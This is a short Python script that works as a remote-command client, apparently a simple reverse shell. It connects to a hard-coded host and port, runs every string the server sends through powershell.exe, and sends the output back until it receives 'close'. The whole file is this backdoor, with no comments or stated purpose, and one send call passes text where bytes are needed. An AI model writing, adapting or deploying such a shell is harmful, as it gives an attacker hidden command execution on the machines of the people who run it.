#!/usr/bin/python

import socket, sys, subprocess
from datetime import datetime

def main():
  hote = "localhost"
  port = 123
  end = True
  connect = False
  now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

  conct = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  while connect == False:
    try:
      conct.connect((hote, port))
      connect = True
    except:
      now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
      print(now, " : Waiting server...")
      continue

  now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
  print(now, " : Connect to the server !")

  while end != False:
    response = conct.recv(255).decode()
    if response == "close":
      end = False
      conct.close()
      sys.exit(0)
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    print(now, " : ",response)

    try:
      result = subprocess.check_output(['powershell.exe', response]).decode()
      if len(result) == 0:
        conct.send("task execute !")
      else:
        conct.send(result.encode())
    except:
      conct.send("error decode...".encode())
      continue

if __name__ == "__main__":
  main()
